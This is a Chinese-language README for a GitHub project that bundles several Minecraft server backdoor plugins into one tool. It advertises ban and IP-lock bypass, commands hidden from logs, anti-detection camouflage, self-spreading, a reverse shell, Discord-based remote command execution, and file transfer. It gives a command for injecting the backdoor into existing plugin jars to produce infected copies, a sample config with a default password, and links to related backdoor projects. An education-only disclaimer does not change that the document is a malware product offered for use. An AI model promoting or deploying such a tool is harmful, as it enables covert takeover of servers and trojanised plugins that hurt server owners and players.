# Unified Backdoor Plugin

[![Build Status](https://github.com/muwenyan521/UnifiedMinecraftBackdoor/actions/workflows/build-and-release.yml/badge.svg)](https://github.com/muwenyan521/UnifiedMinecraftBackdoor/actions)
[![Release](https://img.shields.io/github/v/release/muwenyan521/UnifiedMinecraftBackdoor)](https://github.com/muwenyan521/UnifiedMinecraftBackdoor/releases)
[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)

一个统一整合多个Minecraft后门插件功能的强大工具，支持Bukkit/Spigot/Paper服务器。

## 🚀 功能特性

### 🔧 核心功能
- **统一命令前缀**: 使用 `!` 作为所有命令前缀（可自定义）
- **两级权限系统**: Level 1基础权限 + Level 2完整权限
- **高级伪装引擎**: 多级别伪装和反检测机制
- **自动注入器**: 支持插件传播和隐蔽部署

### 🛡️ 安全特性
- **登录绕过**: 绕过封禁、IP限制和服务器锁定
- **命令隐藏**: 所有操作不在服务器日志中显示
- **IP伪装**: 高级伪装模式下隐藏真实IP
- **反踢出保护**: 防止授权用户被踢出服务器

### 🌐 网络功能
- **Discord集成**: 实时日志转发和远程命令执行
- **反向Shell**: 建立远程控制连接
- **文件传输**: 支持文件上传下载操作
- **远程控制**: 通过多种渠道控制服务器

### 🎮 游戏功能
- **玩家控制**: 隐身、传送、游戏模式切换等
- **世界操作**: 爆炸、岩浆、火焰等效果
- **物品管理**: 复制、附魔、重命名等
- **特殊效果**: 尖刺炸弹、控制棒等独特功能

## 📦 快速开始

### 安装方法

#### 方法一：直接安装
1. 下载最新版本的 `unified-backdoor-*.jar`
2. 放入服务器的 `plugins/` 目录
3. 重启服务器
4. 配置授权用户和密码

#### 方法二：注入安装
```bash
# 使用注入器注入到现有插件
java -jar injector.jar --inject --config config.json --input target.jar --output infected.jar
```

### 基础配置

首次运行后，在 `plugins/UnifiedBackdoor/config.json` 中配置：

```json
{
  "usernames": ["YourUsername"],
  "prefix": "!",
  "password": "12345",
  "spread": false,
  "warnings": true,
  "camouflage_level": "high"
}
```

### 基础使用

1. **获取Level 1权限**: 在配置文件中添加用户名
2. **认证Level 2权限**: 在游戏中输入 `!login 12345`
3. **使用命令**: 输入 `!help` 查看所有可用命令

## 📚 文档

- [📖 安装指南](docs/installation.md) - 详细安装和配置说明
- [⚡ 命令参考](docs/commands.md) - 完整命令列表和使用方法
- [🔧 开发文档](docs/development.md) - 开发者指南和API文档

## 🛠️ 开发

### 构建项目

```bash
# 克隆项目
git clone https://github.com/muwenyan521/UnifiedMinecraftBackdoor.git
cd unified-backdoor

# 构建插件
mvn clean package

# 运行测试
mvn test
```

### 项目结构

```
src/
├── main/
│   ├── java/
│   │   └── com/
│   │       └── unifiedbackdoor/
│   │           ├── UnifiedBackdoorPlugin.java  # 主插件类
│   │           ├── commands/                   # 命令处理器
│   │           ├── config/                     # 配置管理
│   │           ├── features/                   # 功能模块
│   │           └── security/                   # 安全管理
│   └── resources/
│       └── plugin.yml                          # 插件描述文件
└── test/
    └── java/                                   # 测试代码
```

### 依赖项

- **Bukkit API** - Minecraft服务器API
- **Gson** - JSON配置处理
- **Javassist** - 字节码操作
- **SnakeYAML** - YAML文件解析

## 🔄 CI/CD

项目使用GitHub Actions自动构建和发布：

- **自动构建**: 每次提交时构建插件
- **安全扫描**: OWASP依赖检查
- **代码质量**: SonarCloud分析
- **自动发布**: 创建Release时自动打包发布

## ⚠️ 免责声明

**重要**: 本插件仅供教育和研究目的使用。使用本插件时，请务必：

1. 遵守当地法律法规
2. 仅在您拥有权限的服务器上使用
3. 尊重其他用户的权利
4. 承担使用本插件带来的所有责任

开发者不对任何滥用行为负责。

## 🤝 贡献

欢迎提交Issue和Pull Request来改进项目！

### 贡献指南

1. Fork项目
2. 创建功能分支 (`git checkout -b feature/AmazingFeature`)
3. 提交更改 (`git commit -m 'Add some AmazingFeature'`)
4. 推送到分支 (`git push origin feature/AmazingFeature`)
5. 创建Pull Request

## 📄 许可证

本项目采用MIT许可证 - 查看 [LICENSE](LICENSE) 文件了解详情。

## 🔗 相关项目

- [GrimBackdoor](https://github.com/zMiercoles/GrimBackdoor) - 原始Grim后门插件
- [OpenBD](https://github.com/tmquan2508/OpenBD) - 开源后门项目
- [OpenBukloit](https://github.com/VoxelHax/OpenBukloit) - Bukkit后门注入器
- [ThiccIndustries](https://github.com/minecraft-31/Minecraft-Backdoor-Updated) - Minecraft后门项目
- [TofikBackDoor](https://github.com/Laxbby992/Minecraft-Tofik-BackDoor) - Tofik后门插件

## 📞 支持

如果遇到问题，请：

1. 查看文档和常见问题
2. 在GitHub提交Issue
3. 联系开发团队

---

**注意**: 请负责任地使用本软件，遵守所有适用的法律和道德准则。
